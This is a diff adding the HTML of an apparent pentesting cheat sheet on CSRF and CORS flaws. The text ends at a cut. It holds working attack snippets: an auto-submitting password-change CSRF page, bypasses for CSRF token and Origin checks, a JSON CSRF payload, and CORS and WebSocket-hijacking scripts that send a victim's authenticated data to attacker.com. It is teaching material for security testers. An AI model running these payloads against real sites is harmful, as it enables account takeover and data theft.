@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WEB09 CSRF &amp; CORS | JinPwn</title><meta name="description" content="Two related bugs around cross-origin requests. CSRF lets attacker pages make state-changing requests as the victim. CORS misconfigs let attacker pages read sensitive responses cross-origin.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web09-csrf--cors/">
+<meta property="og:title" content="WEB09 CSRF &amp; CORS | JinPwn">
+<meta property="og:description" content="Two related bugs around cross-origin requests. CSRF lets attacker pages make state-changing requests as the victim. CORS misconfigs let attacker pages read sensitive responses cross-origin.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web09-csrf--cors/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="WEB09 CSRF &amp; CORS | JinPwn">
+<meta name="twitter:description" content="Two related bugs around cross-origin requests. CSRF lets attacker pages make state-changing requests as the victim. CORS misconfigs let attacker pages read sensitive responses cross-origin.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Two related bugs around cross-origin requests. CSRF lets attacker pages make state-changing requests as the victim. CORS misconfigs let attacker pages read sensitive responses cross-origin.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"WEB09 CSRF \u0026 CORS | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web09-csrf--cors/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link is-current">WEB09 CSRF &amp; CORS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>WEB09 CSRF &amp; CORS</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">WEB09 CSRF &amp; CORS</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Web Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link is-current">WEB09 CSRF &amp; CORS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>Two related bugs around cross-origin requests. CSRF lets attacker pages make state-changing requests as the victim. CORS misconfigs let attacker pages read sensitive responses cross-origin.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
+</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
+    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>CSRF surfaces:</p>
+<ul>
+<li>Any state-changing endpoint (POST, PUT, DELETE, PATCH)</li>
+<li>Password / email change forms</li>
+<li>Funds transfer / payment</li>
+<li>Admin actions</li>
+<li>&ldquo;Add to cart&rdquo; / &ldquo;place order&rdquo;</li>
+<li>Account deletion</li>
+<li>API key generation</li>
+</ul>
+<p>CORS surfaces:</p>
+<ul>
+<li>Any endpoint that returns sensitive data (<code>/api/me</code>, <code>/api/users/123</code>)</li>
+<li>Endpoints accessed by SPAs (often have <code>Access-Control-Allow-Origin</code>)</li>
+<li>Internal admin APIs that don&rsquo;t expect cross-origin access</li>
+</ul>
+<h2 id="ii-csrf-detection" data-heading-permalink="true"><span class="heading-content">ii. CSRF detection</span>
+    <a class="heading-permalink" href="#ii-csrf-detection" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Check what the app uses to protect the endpoint:</p>
+<ol>
+<li><strong>Token in form</strong> - hidden input like <code>&lt;input name=&quot;csrf_token&quot; value=&quot;abc123&quot;&gt;</code></li>
+<li><strong>Token in header</strong> - custom header like <code>X-CSRF-Token</code> or <code>X-Requested-With: XMLHttpRequest</code></li>
+<li><strong>SameSite cookie attribute</strong> - <code>Set-Cookie: ...; SameSite=Lax|Strict</code></li>
+<li><strong>Origin / Referer checking</strong> - server reads <code>Origin:</code> or <code>Referer:</code> header</li>
+<li><strong>Nothing</strong> - endpoint accepts request with just session cookie</li>
+</ol>
+<p>Quick removal test: drop the CSRF protection and resend the request.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Original request with token, copy from Burp</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Remove the CSRF parameter / header, resend</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Same success response = vulnerable</span>
+</span></span></code></pre></div><p>Cookie attribute check:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -sIv <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/login&#34;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -i set-cookie
+</span></span><span class="line"><span class="cl"><span class="c1">## Look at SameSite:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## - SameSite=Strict      → fully blocks CSRF</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## - SameSite=Lax         → blocks POST CSRF but allows top-level GET nav</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## - SameSite=None        → no protection (requires Secure)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## - SameSite missing     → modern browsers default to Lax-like behavior</span>
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">SameSite=Lax doesn&rsquo;t block everything</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Lax allows GET CSRF via top-level navigation (window.location, anchor click). Any state-changing GET endpoint is still vulnerable. Anything POST → blocked. POST with <code>&lt;form method=GET&gt;</code> redirected to a real POST endpoint can also slip through some configs.</p>
+  </div>
+</div>
+<h2 id="iii-csrf-poc-generator" data-heading-permalink="true"><span class="heading-content">iii. CSRF PoC generator</span>
+    <a class="heading-permalink" href="#iii-csrf-poc-generator" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Burp has it built in (right-click request → Engagement Tools → Generate CSRF PoC). Generates an HTML page that auto-submits a form.</p>
+<p>For JSON endpoints (POST with <code>Content-Type: application/json</code>), <code>&lt;form&gt;</code> can&rsquo;t normally submit JSON. Bypass via content-type tricks (see section v).</p>
+<p>Manual PoC template:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;document.f.submit()&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;f&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://target.com/change-password&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;new_password&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;pwned123&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;confirm&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;pwned123&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>Host it anywhere the victim will visit while logged in. Submit fires automatically.</p>
+<h2 id="iv-csrf-token-bypasses" data-heading-permalink="true"><span class="heading-content">iv. CSRF token bypasses</span>
+    <a class="heading-permalink" href="#iv-csrf-token-bypasses" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="token-not-validated" data-heading-permalink="true"><span class="heading-content">Token not validated</span>
+    <a class="heading-permalink" href="#token-not-validated" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Drop it, resend. If the response is still success → no validation.</p>
+<h3 id="token-validation-bypasses" data-heading-permalink="true"><span class="heading-content">Token validation bypasses</span>
+    <a class="heading-permalink" href="#token-validation-bypasses" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Use a different user&rsquo;s token (any valid token works) → token not tied to session</li>
+<li>Use an empty token → no validation when blank</li>
+<li>Remove the parameter entirely → server only checks if present, not value</li>
+<li>Change request method (POST → GET) → token only checked on POST</li>
+</ul>
+<h3 id="token-tied-to-session-weakly" data-heading-permalink="true"><span class="heading-content">Token tied to session weakly</span>
+    <a class="heading-permalink" href="#token-tied-to-session-weakly" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Submit your own session&rsquo;s CSRF token in the victim&rsquo;s request → may work if token is global, not per-session</li>
+</ul>
+<h3 id="stored-csrf-no-token-needed-at-all" data-heading-permalink="true"><span class="heading-content">Stored CSRF (no token needed at all)</span>
+    <a class="heading-permalink" href="#stored-csrf-no-token-needed-at-all" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Endpoint accepts only cookies, no token at all</li>
+<li>Server expects token via certain header but doesn&rsquo;t reject when missing</li>
+</ul>
+<h3 id="referer--origin-bypasses" data-heading-permalink="true"><span class="heading-content">Referer / Origin bypasses</span>
+    <a class="heading-permalink" href="#referer--origin-bypasses" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>When server checks Referer:</p>
+<ul>
+<li>Strip Referer header entirely (some servers allow blank Referer)</li>
+<li>Use <code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code> in PoC</li>
+<li>Use HTTPS → HTTP downgrade to strip Referer (legacy)</li>
+</ul>
+<p>When server checks Origin via prefix/suffix match:</p>
+<ul>
+<li><code>Origin: https://target.com.attacker.com</code> (suffix attack)</li>
+<li><code>Origin: https://attacker.com/target.com</code> (URL with path)</li>
+</ul>
+<h2 id="v-csrf-on-json-endpoints" data-heading-permalink="true"><span class="heading-content">v. CSRF on JSON endpoints</span>
+    <a class="heading-permalink" href="#v-csrf-on-json-endpoints" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Default browser CSRF requires <code>&lt;form&gt;</code>, which can only send <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>. JSON endpoints often skip CSRF protection assuming browsers can&rsquo;t reach them.</p>
+<p>But many JSON endpoints accept <code>text/plain</code> body that happens to be JSON:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://target.com/api/change-email&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;text/plain&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&#34;email&#34;:&#34;attacker@evil.com&#34;,&#34;x&#34;:&#34;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;&#34;}&#39;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>The form sends body: <code>{&quot;email&quot;:&quot;attacker@evil.com&quot;,&quot;x&quot;:&quot;=&quot;}</code> with <code>Content-Type: text/plain</code>. Many JSON parsers accept it.</p>
+<p>XHR/fetch with <code>Content-Type: application/json</code> is normally blocked by CORS preflight unless the server allows it - see CORS section.</p>
+<h3 id="file-upload-csrf" data-heading-permalink="true"><span class="heading-content">File upload CSRF</span>
+    <a class="heading-permalink" href="#file-upload-csrf" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Multipart forms can upload files cross-origin. If file upload endpoint trusts cookies only, CSRF can upload arbitrary files as the victim.</p>
+<h2 id="vi-cors-misconfigurations" data-heading-permalink="true"><span class="heading-content">vi. CORS misconfigurations</span>
+    <a class="heading-permalink" href="#vi-cors-misconfigurations" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>CORS controls which origins can read responses. Misconfigs let attacker origins read sensitive data.</p>
+<h3 id="common-misconfig-types" data-heading-permalink="true"><span class="heading-content">Common misconfig types</span>
+    <a class="heading-permalink" href="#common-misconfig-types" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p><strong>Wildcard ACAO</strong>:</p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: false
+</code></pre><p>Less dangerous because cookies aren&rsquo;t sent. But still bad if endpoint contains sensitive info bound to IP / token in header.</p>
+<p><strong>Wildcard ACAO with credentials</strong> (browsers should reject this combo, but server should never send it):</p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+</code></pre><p><strong>Reflected ACAO</strong> (the dangerous one):</p>
+<pre tabindex="0"><code>## Request: Origin: https://attacker.com
+## Response: Access-Control-Allow-Origin: https://attacker.com
+##           Access-Control-Allow-Credentials: true
+</code></pre><p>Server echoes any origin it receives. Attacker page reads the victim&rsquo;s authenticated response.</p>
+<p><strong>Null origin allowed</strong>:</p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+</code></pre><p>Sandboxed iframes and data: URLs send <code>Origin: null</code>. Attackers can host a page that sends null and reads the response.</p>
+<p><strong>Subdomain trust</strong>:</p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: https://*.target.com
+## Or via regex / prefix matching
+</code></pre><p>If any subdomain is compromisable (subdomain takeover, XSS on a subdomain), CORS trust extends.</p>
+<p><strong>Prefix/suffix matching bugs</strong>:</p>
+<pre tabindex="0"><code>## Server: allows any origin starting with target.com
+Origin: https://target.com.attacker.com   → allowed
+## Server: allows any origin ending with .target.com  
+Origin: https://attacker-target.com       → allowed
+</code></pre><h2 id="vii-cors-scanners" data-heading-permalink="true"><span class="heading-content">vii. CORS scanners</span>
+    <a class="heading-permalink" href="#vii-cors-scanners" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Corsy (Python):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 corsy.py -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/me&#34;</span>
+</span></span><span class="line"><span class="cl">python3 corsy.py -i urls.txt
+</span></span></code></pre></div><p>CORStest:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 corstest.py <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/me&#34;</span>
+</span></span><span class="line"><span class="cl">python3 corstest.py -i urls.txt
+</span></span></code></pre></div><p>Both probe common misconfigs (wildcard, null, reflected, prefix, suffix) and report findings.</p>
+<p>Burp Pro&rsquo;s scanner catches most of these automatically.</p>
+<h2 id="viii-cors-exploitation-poc" data-heading-permalink="true"><span class="heading-content">viii. CORS exploitation PoC</span>
+    <a class="heading-permalink" href="#viii-cors-exploitation-poc" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Once you find an exploitable CORS misconfig:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://target.com/api/me&#34;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">credentials</span><span class="o">:</span> <span class="s2">&#34;include&#34;</span> <span class="p">})</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">d</span> <span class="p">=&gt;</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://attacker.com/log?d=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">d</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>Host on attacker.com, get the victim to visit. The victim&rsquo;s browser makes the request with cookies, gets the response, attacker reads it cross-origin (because of the misconfig), exfils.</p>
+<h2 id="ix-cswsh-cross-site-websocket-hijacking" data-heading-permalink="true"><span class="heading-content">ix. CSWSH (Cross-Site WebSocket Hijacking)</span>
+    <a class="heading-permalink" href="#ix-cswsh-cross-site-websocket-hijacking" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When the app uses WebSockets and trusts the origin only via the initial Connection upgrade request, attacker pages can open authenticated WebSockets:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s2">&#34;wss://target.com/api/ws&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">m</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://attacker.com/?d=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">m</span><span class="p">.</span><span class="nx">data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;{&#34;action&#34;:&#34;get_data&#34;}&#39;</span><span class="p">);</span>
+</span></span></code></pre></div><p>Same diagnosis as CORS - check if the WebSocket handshake validates <code>Origin:</code> header. If not, vulnerable.</p>
+<h2 id="x-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">x. Tricks worth knowing</span>
+    <a class="heading-permalink" href="#x-tricks-worth-knowing" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="logout-csrf" data-heading-permalink="true"><span class="heading-content">Logout CSRF</span>
+    <a class="heading-permalink" href="#logout-csrf" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
